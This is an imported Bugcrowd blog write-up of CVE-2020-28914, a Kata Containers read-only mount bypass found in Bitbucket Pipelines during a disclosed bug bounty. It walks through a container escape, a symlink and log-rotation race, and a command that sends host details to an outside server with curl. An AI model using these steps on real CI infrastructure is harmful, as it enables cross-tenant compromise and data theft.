---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2021-02-28_big-bugs-bitbucket-pipelines-kata-containers-build-container-escape.md
original_filename: 2021-02-28_big-bugs-bitbucket-pipelines-kata-containers-build-container-escape.md
title: 'Big Bugs: Bitbucket Pipelines Kata Containers Build Container Escape'
category: documents
detected_topics:
- mfa
- supply-chain
- cloud-security
- mobile-security
- sqli
- automation-abuse
tags:
- imported
- documents
- mfa
- supply-chain
- cloud-security
- mobile-security
- sqli
- automation-abuse
language: en
raw_sha256: 5b3d1e7223d9beb0f49e270b56b846fa05d3148f1dd093818f10e482bf8b5af5
text_sha256: 9b17b623124599072a149b7a9d06fe121f0a72155ba701b7eda77b97ac79ed8d
ingested_at: '2026-06-28T07:32:05Z'
sensitivity: unknown
redactions_applied: false
---

# Big Bugs: Bitbucket Pipelines Kata Containers Build Container Escape

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2021-02-28_big-bugs-bitbucket-pipelines-kata-containers-build-container-escape.md
- Source Type: markdown
- Detected Topics: mfa, supply-chain, cloud-security, mobile-security, sqli, automation-abuse
- Ingested At: 2026-06-28T07:32:05Z
- Redactions Applied: False
- Raw SHA256: `5b3d1e7223d9beb0f49e270b56b846fa05d3148f1dd093818f10e482bf8b5af5`
- Text SHA256: `9b17b623124599072a149b7a9d06fe121f0a72155ba701b7eda77b97ac79ed8d`


## Content

---
title: "Big Bugs: Bitbucket Pipelines Kata Containers Build Container Escape"
page_title: "Big Bugs: Bitbucket Pipelines Kata Containers Build Container Escape | @Bugcrowd"
url: "https://www.bugcrowd.com/blog/big-bugs-cve-2020-28914/"
final_url: "https://www.bugcrowd.com/blog/big-bugs-cve-2020-28914/"
authors: ["Alex Chapman (@ajxchapman)"]
bugs: ["RCE"]
publication_date: "2021-02-28"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 3853
---

[Bug Hunter Methodology](https://www.bugcrowd.com/blog/?t__category=21)

# Big Bugs: Bitbucket Pipelines Kata Containers Build Container Escape

March 1, 2021 | By [Michael Hamel](https://www.bugcrowd.com/blog/?a__author=29)

![](https://www.bugcrowd.com/wp-content/uploads/2022/05/BigBugs.png)

[Back to blog](https://www.bugcrowd.com/blog/)

Atlassian ran a project on Bugcrowd looking for bugs in their proposed implementation of [Kata Containers](https://katacontainers.io/) within the Bitbucket Pipelines CI/CD environment.Ê

Within the project, Researcher Alex Chapman ([axjchapman)](https://bugcrowd.com/ajxchapman) identified a vulnerability in Kata Containers which could allow processes running in the Kata VM to write to supposedly read-only volume mounts. Exploiting this vulnerability allowed a malicious build job to write semi-controlled data to arbitrary files on the host system as the root user.

This vulnerability was fixed by the Kata Containers team and assigned [CVE-2020-28914](https://github.com/kata-containers/community/blob/master/VMT/KCSA/KCSA-CVE-2020-28914.md). 

**Quick Links:Ê**

Atlassian Team Digest

Introduction to the Bug

Bug Hunting

Impact Assessment and Exploitation

Timeline

References

* * *

#### Atlassian Team Digest

We asked the Atlassian team to describe the impact of the Kava VM vulnerability within the Bitbucket Pipelines CI/CD environment and the remediation process:

The impact of the vulnerability is significant. After iterating on the exploit, the researcher was able to demonstrate that overwriting the bind-mounted docker binary from the pipelines host could reasonably lead to assuming root privileges on the pipelines host. Because the Bitbucket Pipelines is a multi-tenant environment, breaking out of the Kata Container onto the Bitbucket Pipelines hostÊ allows an attacker to interfere with any customerÕs pipeline builds on that same host.

Bitbucket Pipeline vulnerabilities are relatively complex, so they require more communication with the researcher during the review process. In this case, once the host docker binary overwrite was found, the researcher submitted the BugCrowd report to us to track internally and help start the remediation process. For remediation, we first assessed the vulnerabilityÕs severity and attempted to reproduce it. The researcherÕs detailed reports were a big help here – proper reproduction steps and analysis reduced the time we spent understanding the vulnerability and let us assign it to the relevant development team sooner. Then, as the development team was looking at the issue, the researcher worked on demonstrating that the vulnerability could be chained into additional exploitation for broader access. Communication had to be kept with the researcher to relay any additional information to the development team to escalate the issue internally if needed. In this particular case, our development team determined the source of the issue was upstream in the Kata Container project, so beyond filing an issue with them there wasnÕt a major engineering effort on our end.

– Matthew Bass, Product Security Engineer

What has your experience been working with CrowdSourced security and how has working with the Crowd impacted/changed your perspective on the Information Security space?

I’ve had a great experience working with CrowdSourced security. The bug bounty is a very valuable tool for us and many of our most critical findings are reported through our bug bounty programs. We have also made larger security improvements to some of our products based on trends seen in the bug bounty.

Working on the bug bounty at Atlassian was actually my first project in InfoSec, so it actually played a big part in forming my perspective. I think the bug bounty is an essential piece of vulnerability discovery at Atlassian. Many of the issues we receive in the bug bounty really cannot be found by scanners and the researchers who report vulnerabilities to us cover a wider skill set than we could not easily hire. Just in this private bounty program there are a number of container security experts vetting our product and reporting issues.

-Erin Jensby, Product Security Engineer

* * *

The following write-up is an account of the bug discovery process along with an assessment of the impact of exploiting the bug in the project Bitbucket Pipelines environment.

#### **Introduction**

Bitbucket Pipelines is a CI/CD environment which runs build jobs from Bitbucket repositories. Atlassian were trialing a new Pipelines build environment which used Kata Containers to attempt to logically separate the build jobs of different users. Kata Containers is an implementation of a CRI compatible container runtime which executes containers via Containerd within individual QEMU Virtual Machines (VMs). The goal of this new environment was to provide a higher level of security and separation than regular containerization in the event of a malicious build job escaping a build container.

In the new Bitbucket Pipelines environment build jobs were executed as Kubernetes Pods with Kata Containers configured as the container runtime, causing each build job to be executed within separate Kata VMs.![](https://www.bugcrowd.com/wp-content/uploads/2022/05/104167782-da07c500-53f4-11eb-924b-81e4c3aeafe4.png)

_Bitbucket Pipelines environment overview_

Each build job consisted of several containers, a build container for running user provided build commands, several service containers for executing required Pipelines and build services, and a privileged Docker-in-Docker (DIND) container for executing Docker commands. All containers for an individual build job were executed in the same Kubernetes Pod within a single Kata VM.

In this environment no build job should be able to affect the output of another build job running on the same Kubernetes node, or be able to escape the Kata VM in order to compromise the node. My goal was to attempt to disprove these assertions.

#### **Bug Hunting**

##### **Escaping to the Kata VM**

From the build container, the Docker service running in the privileged DIND container could be used to launch further privileged containers*. Using the technique I previously described in [Privileged Container Escape – Control Groups release_agent](https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html), the container environment could be escaped, permitting command execution as the root user directly within the Kata VM. Whilst this was not a vulnerability as such, it was an important stepping stone to assist in finding bugs in the rest of the environment.

* _It should be noted that Bitbucket Pipelines in production implements a Docker authorization plugin to prevent arbitrary Docker commands being run within the privileged DIND container, but for this project assessment that plugin was disabled._

#### **Kata Containers ‘hostPath’ vulnerability discovery**

Within the build container volume mounts could be discovered through the mounted file systems. In investigating the mounted paths I noticed several kataShared mounts:
  
  
  root@buildcont$ mount
  ...
  kataShared on /etc/hostname type 9p (rw,dirsync,nodev,relatime,mmap,access=client,trans=virtio)
  kataShared on /dev/termination-log type 9p (rw,dirsync,nodev,relatime,mmap,access=client,trans=virtio)
  kataShared on /etc/hosts type 9p (rw,dirsync,nodev,relatime,mmap,access=client,trans=virtio)
  kataShared on /etc/resolv.conf type 9p (rw,dirsync,nodev,relatime,mmap,access=client,trans=virtio)
  kataShared on /usr/bin/docker type 9p (ro,dirsync,relatime,mmap,access=client,trans=virtio)
  ...

_Output truncated for readability._

Reading the Kata Containers documentation I discovered that these mounts wereÊ`hostPath`Êvolumes from the container host via the Plan 9 Filesystem Protocol (9p).Ê`hostPath`Êvolumes mount paths from the container host directly into the container.

One of the mounted paths looked particularly interesting,Ê`/usr/bin/docker`. The build container was configured to have the Docker client binaryÊ`hostPath`Êmounted from the container host. I believe that this was a convenience to ensure that no matter what base image was used for the build container (the base image is user configurable), it would be able to access the DIND service without having to manually install the Docker client.

From theÊ`mount`Êoutput it could be clearly seen that theÊ`/usr/bin/docker`Êpath was mounted read-only, and any attempt to write to this path would be denied by the Kernel.

Checking the mount points from the Kata VM showed that individual container mount points were not visible, only a single ‘parent’ mount point existed.
  
  
  root@katavm$ mount 
  ...
  kataShared on /run/kata-containers/shared/containers type 9p (rw,nodev,relatime,dirsync,mmap,access=client,trans=virtio)
  ...

_Output truncated for readability._

Under this path however, the individual container mounts were present as files and directories:
  
  
  root@katavm$ ls -la /run/kata-containers/shared/containers
  ...
  -rw-r--r--  1 root root  43 Oct 26 11:47 6f727...b39fb-hostname
  -rw-rw-rw-  1 root root  0 Oct 26 11:47 6f727...7097c-termination-log
  -rw-r--r--  1 root root  239 Oct 26 11:47 6f727...c5e0e-hosts
  -rw-r--r--  1 root root  42 Oct 26 11:47 6f727...268f9-resolv.conf
  -rwxr-xr-x  1 root root 50683148 Jan  9  2019 6f727...4440e-docker
  ...

_File names and output truncated for readability._

In an attempt to understand the mount process further, I set up a test Kubernetes environment on a VPS and configured Kata Containers as the container runtime. I then deployed a Pod with a read-only hostPath volume as below:
  
  
  apiVersion: apps/v1
  kind: Deployment
  metadata:
  name: build-deployment
  spec:
  selector:
  matchLabels:
  app: build
  template:
  metadata:
  labels:
  app: build
  spec:
  runtimeClassName: kata
  containers:
  - name: build
  image: alpine:latest
  command: ["tail"]
  args: ["-f", "/dev/null"]
  volumeMounts:
  - mountPath: /usr/bin/docker
  name: docker
  readOnly: true
  volumes:
  - name: docker
  hostPath:
  path: /opt/docker/bin/docker

Assessing the test environment I discovered that container hostPath volumes followed a somewhat complicated mounting chain from the host to the target container, this is outlined below:

  1. The source mount path was bind mounted into the target Kata VM share directory on the container host (/run/kata-containers/shared/sandboxes/<KataVM_ID>/shared/).
  2. The Kata VM share directory was shared over a virtio-9p-pci device into the target Kata VM.
  3. Within the Kata VM the virtio device was mounted to the container share directory (/run/kata-containers/shared/containers).
  4. The mount path was bind mounted from the container share directory into the destination container.

At this point I noted something odd:
  
  
  root@host$ mount
  ...
  /dev/vda1 on /run/kata-containers/shared/sandboxes/9619d...b411d/shared/7277c...f78c0-docker type ext4 (rw,relatime)
  ...
  root@host$ cat /proc/self/mountinfo
  ...
  3196 2875 252:1 /opt/docker/bin/docker /run/kata-containers/shared/sandboxes/9619d...b411d/shared/7277c...f78c0-docker rw,relatime master:1 - ext4 /dev/vda1 rw
  ...

_File names and output truncated for readability._

The output above shows that even though the docker mount was configured as read-only in the Pod YAML, it was bind mounted read-write into the Kata VM share directory. Despite this, it was ultimately being mounted read-only within the destination container. This implied that the read-only protection was being applied from within the Kata VM, meaning that the mount source could potentially be modified by commands running directly in the Kata VM.

Since command execution within the Kata VM had already been obtained (see section ‘Escaping to the Kata VM’ above), I tested this by writing to the supposedly read-only docker binary.
  
  
  root@katavm$ echo 1 > /run/kata-containers/shared/containers/7277c...f78c0-docker

_File names truncated for readability._

The write was successful and the modified docker binary could be seen from the container host.
  
  
  root@host$ ls -la /opt/docker/bin/docker
  -rwxr-xr-x  1 root root 2 Oct 26 18:16 /opt/docker/bin/docker
  root@host$ cat /opt/docker/bin/docker
  1

Moving back to the Pipelines environment, I confirmed I was able to modify the docker binary on the container host, and have the modified binary affect another build, _very cool_!

_![BitBucket Pipelines output showing result of running the modified `docker` binary from a build job](https://www.bugcrowd.com/wp-content/uploads/2022/05/104167784-daa05b80-53f4-11eb-9874-166d93c3677f.png)Bitbucket Pipelines output showing result of running the modified `docker` binary from a build job_

Unfortunately through a bug in my PoC I managed to corrupt my backup of the docker binary, breaking it for all other builds run on the node, _very not cool_!

It was here I decided to clean up as much as I could and open the initial [Bugcrowd report](https://bugcrowd.com/disclosures/7bf77429-2b94-44ea-b6f9-c1fc59b2fd17/host-docker-binary-overwrite-from-kata-vm) stating I may have DoSed the Pipelines environment and would provide a full report as soon as possible. I got a full report written up several hours later.

## **Impact Assessment and Exploitation**

I had identified that the docker binary which was mounted into each build container on a node could be overwritten with malicious code. This could be exploited to modify the build output of other builds on the same node, but unfortunately it did not appear that this could be exploited to escape the Kata VM and execute commands on the container host, my ultimate goal.

Further assessment identified another read-only hostPath volume which mounted the /var/log/pods/$(NAMESPACE_NAME)_$(POD_NAME)_$(POD_ID) directory. This mount included container standard output logs for each container in the Pod. It appeared that this mount was used by an ‘agent’ container to report build and service container output to the Pipelines web UI.

Each container in the Pod had a separate subdirectory within the log directory, with the standard output of the container being written to 0.log under its subdirectory. Each line of output from the container was recorded, prepended with a time stamp, stream name and truncation status, such as below:
  
  
  2020-10-29T12:49:35.410976914Z stdout F id
  2020-10-29T12:49:35.503666526Z stdout F uid=0(root) gid=0(root) groups=0(root)

Looking for the /var/log/pods directory in my test environment, I quickly identified that these logs were being written by the containerd process running on the container host.

This second mount seemed more promising for escaping the Kata VM for three reasons:

  1. The source of the mount was a directory, not just a single file like the docker mount
  2. The files in the directory were being written by a process running as the root user on the container host
  3. The data written to the files could be at least partially controlled as it included the stdout of containers under the control of the build job

As I dug further into the potential avenues of exploitation for this issue I kept the Bugcrowd report updated with the new information I was discovering.

### **Write Primitive**

My first idea to exploit this log mount was to replace the current standard output log file for a test container with a symlink to another file, then have the container write controlled data to the standard output stream. Amazingly this worked first time, linking the test/0.log file to test/1.log resulted in the standard output stream for the ‘test’ container being written to the target test/1.log file.

To prove the symlink destination was being written by a process on the container host (and not from within the Kata VM), I configured my test Kubernetes environment with a Pod mounting the /var/log/pods/$(NAMESPACE_NAME)_$(POD_NAME)_$(POD_ID) directory and confirmed this technique would create new files on the container host outside of the mounted log directory.

At this point I could create any new files on the container host with -rw-r—– permissions, owned by root:root and with partially controlled data. Unfortunately however, it appeared that existing files could not be overwritten or appended to. Without the ability to append to existing files this issue would be more difficult to exploit, as the files that I could on the container host did not have ‘execute’ permissions.

### **Append Primitive**

For some unknown reason, when symlinking test/0.log to an existing file Containerd would refuse to overwrite or append to the symlink target. This annoyed me more than it should, so I went looking through the Containerd source code on GitHub for why this might be.

It turned out that Containerd would ignore errors when writing container standard output log lines, and had no automatic method to reopen log files on error. I discovered that the write primitive above actually worked due to the log rotation code in Kubernetes Kublet. Every 10 seconds the Kubernetes kubelet process would check the container standard output log directory for each running container. If the 0.log file did not exist, Kubelet would send a gRPC request to Containerd telling it to reopen the log file. However, in the case that 0.log had been symlinked to an existing file, Kublet saw the file existed and did not make the gRPC call, preventing Containerd from writing to the symlink location.

Looking over the Kubelet log rotation code, I discovered a possibility for appending to existing files. If 0.log was greater than 10MB, Kubelet would rotate 0.log to 0.log.<timestamp> and then send a gRPC request to Containerd telling it to reopen the 0.log file for logging.
  
  
  func (c *containerLogManager) rotateLatestLog(id, log string) error {
  timestamp := c.clock.Now().Format(timestampFormat)
  rotated := fmt.Sprintf("%s.%s", log, timestamp)
  if err := c.osInterface.Rename(log, rotated); err != nil {
  return fmt.Errorf("failed to rotate log %q to %q: %v", log, rotated, err)
  }
  if err := c.runtimeService.ReopenContainerLog(id); err != nil {

_[Github Source](https://github.com/kubernetes/kubernetes/blob/master/pkg/kubelet/logs/container_log_manager.go)_

This non-atomic operation across two processes contains a relatively simple race condition. If, after Kubelet has rotated 0.log but before Containerd has reopend 0.log, 0.log is created as a symlink to an existing file, Containerd will happily open the symlink destination and append all future log lines.

_Aside:_ There is also a way to exploit the Kubelet log rotation behaviour to read files from the container host, but the details of this are left to be discovered by the reader.

### **Exploitation (or lack thereof)**

Now with the ability to append to arbitrary files on the container host, my plan was to identify a shell script likely to exist and append lines which would execute arbitrary shell commands. For example, executing the following in a container:
  
  
  echo 'Run command \$({ hostname; id; uname -a; } 2>&1 | curl -T - http://debug.webhooks.pw/log)'

Would result in the following lines being appended to the target shell script:
  
  
  2020-11-02T08:43:34.846940623Z stdout F + echo 'Run command \$({ hostname; id; uname -a; } 2>&1 | curl -T - http://debug.webhooks.pw/log)'
  2020-11-02T08:43:34.846946507Z stdout F Run command \$({ hostname; id; uname -a; } 2>&1 | curl -T - http://debug.webhooks.pw/log)

When executed from a bash or sh shell, the sub command { hostname; id; uname -a; } 2>&1 | curl -T – http://debug.webhooks.pw/log would be executed, which would record the output of the hostname, id and uname -a commands to a webserver under my control. (Since sub-commands are evaluated before the ‘main’ command on a line in a shell script, it did not matter that the ‘main’ command, 2020-11-02T08:43:34.846946507Z in this instance, was not a valid shell command.)

Unfortunately between the time of the initial report and the Kata Containers fix being applied in the Pipelines environment I was unable to identify a suitable target shell script to write to on the container host. Ultimately howev

Tags:

  * [Atlassian](https://www.bugcrowd.com/blog/?t__post_tag=150)
  * [coordinated disclosure](https://www.bugcrowd.com/blog/?t__post_tag=391)
  * [researcher community](https://www.bugcrowd.com/blog/?t__post_tag=335)

#### Latest Blog Posts

Experience vs methodology: How hackers make decisions

[Learn More](https://www.bugcrowd.com/blog/experience-vs-methodology-how-hackers-make-decisions/)

Community spotlight: Just Eat Takeaway.com

[Learn More](https://www.bugcrowd.com/blog/community-spotlight-just-eat-takeaway-com/)

Bugcrowd and Pi: Combining vulnerability discovery and engineering execution

[Learn More](https://www.bugcrowd.com/blog/bugcrowd-and-pi-combining-vulnerability-discovery-and-engineering-execution/)

Category AI Safety and Security Attack Surface Management Blog Bug Bounty Management Bug Hunter Methodology Bugcrowd News Bugcrowd Platform Bugcrowd Spotlight Community Community Spotlight Company Resources Conferences and Events Customer Blog Customer Stories Cybersecurity News Guest Blogs Hacker Event Hacker Resources Hacker Spotlight LevelUpX New Product Penetration Testing Penetration Testing as a Service Platform Product Spotlight Product Updates Program Launches Program Management Program Updates Red Teaming Report Recap Researcher Event Researcher Resources Researcher Spotlight Security Flash Success Stories Thought Leadership Thought piece Uncategorized Unsolved Cyber Mysteries Vulnerabilities Vulnerability Disclosure Webinar Recap Winner's Circle

Tag 2020 predictions 2020 updates 2021 predictions 2023 security statistics 2024 cybersecurity 2024 election security 2024 security report 2024 security trends 2025 security breach 2025 security predictions 2026 predictions 2fa 2fa bypass 2fa exploit adversarial AI adversarial security adversarial testing Agile AI AI 2024 AI analytics AI app testing AI applications AI attack AI attacks AI bias AI bias assessment AI bias defined AI bias example AI bias impact AI bias security testing AI bias testing AI bug bounty AI bug hunting AI compliance AI connect AI crime AI cybercrime AI cybersecurity AI data AI data bias AI data privacy AI defenses AI exploits AI flaw reporting AI hackers AI hacking AI hacking slop AI hacking statistic AI initiatives AI jailbreaking AI malware AI misconceptions AI nuclei templates AI offensive security AI offensive testing AI pen test AI pen testing AI penetration testing AI privacy AI projects AI prompt injection AI reconnaissance AI red team AI red team example AI red teaming AI red teaming scenarios AI regulation AI risk assessment AI risks AI safe harbor AI safety AI safety bias assessment AI scams AI security AI security adoption AI security defenses AI security flaw AI security landscape AI security laws AI security misconceptions AI security research AI security researcher AI security risk AI security risks AI security strategy AI security testing AI shipping security AI slop bug bounty AI slop government AI slop government security AI social engineering AI spam hacking AI targets AI testing AI threat simulation AI threats AI tools hacking AI transparency AI triage AI triage assistant AI vulnerabilities AI vulnerability AI vulnerability reporting AI-powered security AMA ambassador program analytics Android antonio bovoso API API penetration testing API vulnerabilities APIs Apple application security application security testing Applications appsec ARK Artificial Intelligence ASM ASM compliance ASM risk ASM strategy asm tools asset context asset discovery asset inventory asset prioritization asset risk asset testing asset view asset visibility Atlassian attack attack surface attack surface analysis attack surface discovery attack surface discovery tools Attack Surface Management attack surface management solutions attack surface management tools attack surface mapping attack surface pen testing attack surface penetration testing attack surface visibility attack vector attack vectors augment red team Auth0 auto insurance automation Autosave average severity award Awards AWS Axis Communications Azure benefits of a VDP benefits of bug bounty programs benefits of crowdsourced security testing benefits of offensive security benefits of pen testing benefits of penetration testing benefits of red teaming best practice best practices bigbank Binance Black Hat black hat 2023 black hat 2024 black hat parties black hat summary black hat takeaways blackhat 2023 blast radius blockchain board deck help bob lord BOD 20-01 BOD 20-01 compliance bonus bounty rewards Bounty Slayer bounty slayers Box Braden Russell breach BSides BSides SF budgeting bug bash bug bounties bug bounty bug bounty AI bug bounty AI slop bug bounty briefs bug bounty case study bug bounty compliance bug bounty cost bug bounty customer bug bounty customers bug bounty engagement bug bounty fed bug bounty fedramp bug bounty financial services Bug bounty G2 bug bounty hackers bug bounty hacking bug bounty hardware bug bounty hunter bug bounty infographic bug bounty PCI bug bounty platform bug bounty progams bug bounty program bug bounty program management Bug bounty programs bug bounty pros and cons bug bounty researchers bug bounty results bug bounty reviews bug bounty rewards bug bounty ROI bug bounty rules bug bounty success bug bounty testimonials bug bounty tips bug bounty trends bug bounty triage bug bounty trust bug bounty vs pen test bug bounty vs pen testing bug hunter bug hunting bugcrowd Bugcrowd academic program bugcrowd access bugcrowd acquisition bugcrowd advice bugcrowd advisors Bugcrowd advisory board bugcrowd AI Bugcrowd AI analytics Bugcrowd AI features Bugcrowd AI slop bugcrowd AMA Bugcrowd analytics bugcrowd asset view bugcrowd automation bugcrowd awards bugcrowd banking bugcrowd best practices bugcrowd black hat bugcrowd black hat happy hour bugcrowd blockchain bugcrowd board bugcrowd board of advisors Bugcrowd CAB bugcrowd careers bugcrowd case studies bugcrowd case study Bugcrowd CDAO bugcrowd CEO bugcrowd CISA Bugcrowd CISO Bugcrowd code of conduct bugcrowd competition bugcrowd compliance Bugcrowd CPO Bugcrowd CREST bugcrowd crowdmatch Bugcrowd culture Bugcrowd customer Bugcrowd customer success bugcrowd customers bugcrowd cybersecurity bugcrowd data Bugcrowd DORA Bugcrowd EU data act Bugcrowd Europe Bugcrowd events bugcrowd executives bugcrowd features bugcrowd federal Bugcrowd fedramp bugcrowd finserv bugcrowd for government bugcrowd funding Bugcrowd G2 Bugcrowd GDPR compliance bugcrowd government bugcrowd growth bugcrowd hacker bugcrowd hacker rewards bugcrowd hacker showdown bugcrowd hacker success bugcrowd hacker tips bugcrowd hacker women Bugcrowd hackers bugcrowd hacking Bugcrowd hardware bugcrowd ID verification bugcrowd innovation Bugcrowd innovation lab Bugcrowd insights bugcrowd jobs bugcrowd leadership bugcrowd local data bugcrowd marketing bugcrowd mythos bugcrowd news bugcrowd partner bugcrowd partners Bugcrowd payments Bugcrowd pen test certification Bugcrowd pen testing bugcrowd platform Bugcrowd platform AI Bugcrowd product updates bugcrowd products bugcrowd pros and cons bugcrowd public sector bugcrowd red team bugcrowd red teamers Bugcrowd red teams bugcrowd regulation bugcrowd reinforcement learning bugcrowd review Bugcrowd reviews bugcrowd RL bugcrowd RLE bugcrowd roadmap bugcrowd ROI Bugcrowd RSA bugcrowd RTaaS bugcrowd rules bugcrowd savant bugcrowd scholar program bugcrowd security flash bugcrowd security inbox bugcrowd security researcher bugcrowd shirt bugcrowd slop bugcrowd stickers bugcrowd support bugcrowd SVB bugcrowd swag bugcrowd team bugcrowd teams Bugcrowd TEI Bugcrowd testimonials bugcrowd tips bugcrowd triage bugcrowd trust bugcrowd university Bugcrowd VDP Bugcrowd VRT bugcrowd vs hackerone bugcrowd vs hackerone vdp bugcrowd vulnerability bugcrowd webinar Bugproud business case caesars breach CAF california cybersecurity California VDP CAP bypasses car hacking career advice case study Casey Ellis casino breach CCPA Certification CFAA CFAA ethical hacking CFAA security research challenge chatbot prompt injection ChatGPT chief product officer Chief Strategy and Trust Officer CISA CISA funding CISA funding cuts CISA ivanti CISA mandate CISA pledge CISA secure by design CISA VDP CISO CISO advice CISO AI CISO board advice CISO board deck best practices CISO board decks CISO burnout CISO career path CISO compliance CISO crowdsourced security CISO hacking CISO hiring CISO interview CISO legal exposure CISO priorities CISO professional development CISO report CISO risk CISO risk committee CISO statistics CISO tips CISOs classdojo classdojo bug bounty classdojo security classic pen test classifying vulnerabilities clickhouse clickhouse bug bounty cloud cloud API security cloud asset discovery cloud attack surface cloud attack surface management cloud misconfigurations cloud penetration testing cloud security cloud security threats CMA CMA UK code Code of Conduct code red explained code red infection code red virus code red worm college bug bounty color teaming combining bug bounty and pen testing comments common attack vectors community COMMUNITY SPOTLIGHT compliance compliance assessment framework compliance framework compliance frameworks components of AI red teaming compromised credentials computer fraud and abuse act Computer Misuse Act conference Conference 2023 conference takeaways Conferences configuration weakness container security continuous pen testing continuous pen testing finserv continuous penetration testing continuous security validation continuous testing compliance coordinated disclosure coordinated vulnerability disclosure copy fail copy fail vulnerability Coronavirus coverage analysis COVID-19 CRA CRA compliance CRA dates CRA frameworks CRA implications CRA penalties CREST certified pen test critical infrastructure attacks critical vulnerabilities cross site scripting Crowd crowd stats crowd trust crowdcontrol crowdfear crowdmatch crowdsource crowdsourced red teaming crowdsourced security crowdsourced security AI crowdsourced security case study crowdsourced security customer crowdsourced security data crowdsourced security europe crowdsourced security fed crowdsourced security fedramp crowdsourced security government crowdsourced security growth crowdsourced security infographic crowdsourced security public sector crowdsourced security regulation crowdsourced security reporting crowdsourced security ROI crowdsourced security testing crowdsourced security tips CrowdStream crown jewel exposure crypto cryptography CSA CSRF CTF CTF Challenge cURL curl AI cURL bug bounty cURL bug bounty AI CURL bug bounty program cURL hacking cURL security research customer spotlight customer stories customers CVE CVE 2025 0133 CVE 2026 31431 CVE database CVE foundation CVE-2024-3094 CVE-2025-55182 CVSS cyber conspiracy modernization act cyber conspiracy modernization meaning cyber governance cyber hygiene cyber insurance premiums cyber mysteries cyber resilience act cyber risk management cyber security best practices cyber security options cyber security practices cyber strategy for america cyber threats cyberattack cyberattacks cybercrime cybercriminals cyberscoop cybersecurity cybersecurity advice cybersecurity awareness month cybersecurity best practices cybersecurity career advice cybersecurity careers cybersecurity certifications cybersecurity checklist cybersecurity compliance cybersecurity compliance UK cybersecurity content marketing cybersecurity curricula cybersecurity customer cybersecurity funding cybersecurity halloween cybersecurity infographic cybersecurity innovation cybersecurity job advice cybersecurity jobs cybersecurity memes cybersecurity networking cybersecurity news cybersecurity predictions cybersecurity regulation cybersecurity risk management cybersecurity skills gap cybersecurity strategy for america cybersecurity talent cybersecurity talent gap cybersecurity tips cybersecurity vulnerability reduction act cyberwarfare Dan Maslin data bias data bias protection data breach data privacy david fairman netskope DBIR report DDos deep scams deepfakes DEF CON DEF CON 2023 def con 31 DEF CON 32 DEF CON AI village DEF CON bugcrowd DEF CON parties defcon defcon badge defending against AI bias Department of Defense Department of homeland security development device code exploitation device code phishing devops DevOps adoption devsec DevSecOps difference digital asset discovery digital attack surface Digital operational resilience act dirty pipe disclose.io disclosure diversity Django DoD DORA DORA compliance DORA compliance tools DORA continuous testing DORA cost DORA deadline DORA fines DORA frameworks DORA penalties DORA security controls DORA solution DORA summary DORA testing Draft Submissions drift hack drift salesforce drift salesforce hack Duplicates EASM ecommerce ED-203A Education effective cyber security election hacking election security email scams embrace equality engineer engineered triage Enhancement ESG ethical hacker ethical hacker legal protection ethical hacker spotlight ethical hackers ethical hacking ethical hacking mistakes EU AI Act EU AI act dates EU AI act features EU AI Act frameworks EU AI Act regulations EU AI compliance EU compliance EU cybersecurity compliance EU PLD EU security compliance EU security regulation EUVD events examples of AI bias examples of attack vectors Excellence excessive agency exploit bench exploit validation exploitbench exploitbench mythos expressvpn expressvpn case study external attack surface management external network facebook Fast Company Feature Update February fed cybersecurity fed gov security federal federal bug bounty program federal cybersecurity federal VDP female hackers ffuf finance financial services financial services bug bounty financial services bugcrowd financial services pen testing financial services security financial services security regulations finserv finserv bug bounty programs finserv compliance finserv crowdsourced security finserv pen test finserv penetration testing finserv security finserv security testing fintech fintech crowdsourced security fintech security fireblocks fireblocks bug bounty fireblocks security Forrester Forrester bug bounty forrester bugcrowd Forrester crowdsourced security Foundational Knowledge fraud free VDP free vulnerability disclosure program FS-ISAC full time hacking funding future of security future security research fuzz testing fuzz testing bugcrowd fuzz testing government fuzz testing public sector fuzzing bugcrowd G2 bugcrowd g2 cybersecurity reviews gaming Gapsville GDPR gen AI gender equality generative ai generative ai cybersecurity generative ai hackers generative AI hacking generative ai security github GLBA GlobalProtect VPN goals of SBD good cybersecurity practices good faith security research Google google play government government bug bounty government crowdsourced security government cybersecurity government security government security research government VDP group hacking guest post H.R. 872 Hack the Pentagon hacker hacker advice hacker battlestations hacker best practices hacker community hacker controls Hacker Cup hacker diversity hacker horoscope hacker jokes hacker legal protection hacker set up hacker shows hacker spotlight hacker success hacker summer camp hacker swag hacker teams hacker trends hacker trust hacker vetting hacker vibe coding hackerone vs bugcrowd reviews hackers hackers and AI Hackers on the Hill hackher hackher network hacking hacking advice hacking AI hacking best practices hacking careers hacking competition hacking events hacking laws hacking legislation hacking memes hacking methodology hacking MFA hacking nuclei templates hacking policy council hacking research hacking resources hacking teams hacking tips hacking tools hacking trends hacking with AI agents hacking with n8n hacking zodiac hacklore hacktivism hall of fame halloween hardware hackers hardware hacking hardware security hardware security research hardware VRT hardware vulnerabilities healthcare healthcare ransomware higher education cybersecurity HIMSS HOF holiday holiday cybersecurity holiday security hospitals how bugcrowd works How to how to become a red teamer how to build a risk committee how to create a VDP How to get started How to get swag how to join a red team how to join Bugcrowd's red team how to start a bug bounty program HPC HR 872 human attack surface human security testing IBM iCloud IDaaS IDOR image embessing improve security posture Incentive Programs incentives incident disclosure incident response industries infographic informational informer infosec infosec eu infrastructure infrastructure pen test Ingenuity unleashed awards innovation Inside the mind of a CISO inside the mind of a hacker insider threats insights dashboard instagram insurance integrate nuclei templates integrations internal red teams international women's day international women's day 2023 internet of things Invision ios IoT bugcrowd IoT defense IoT device attacks IoT device hacking IoT device tampering IoT hacking IoT security IoT vulnerabilities Iran cybersecurity ISO IEC 27001 IT compliance IT infrastructure management IT-ISAC ITMOAH ItTakesACrowd ivanti ivanti CVE ivanti remediation ivanti VPN ivanti vulnerability IWD2021 Japan Bug bounty Japan pentest Jira Jira integration joinable programs June juneteenth just eat bug bounty just eat VDP just for you Kaseya knowledge graph kudos las vegas cyber attacks launching a program leaderboard leadership least privilege legal level up LevelUp LGBTQ LLM attacks LLM hackers LLM jailbreaking LLM jailbreaking prompts LLM offensive security LLM safety LLM security LLM vulnerabilities LLMs log4j M&A machine learning machine-based attacks managed bug bounty managed bug bounty programs managed bug bounty reviews managed_bug_bounty maritime breaches maritime cyberattacks maritime cybersecurity maritime security marketplaces max headroom max headroom impersonator May Mayhem security media management security medical devices meet the crowd merger & acquisition merger and acquisition methods of LLM jailbreaking MFA MFA attacks MFA 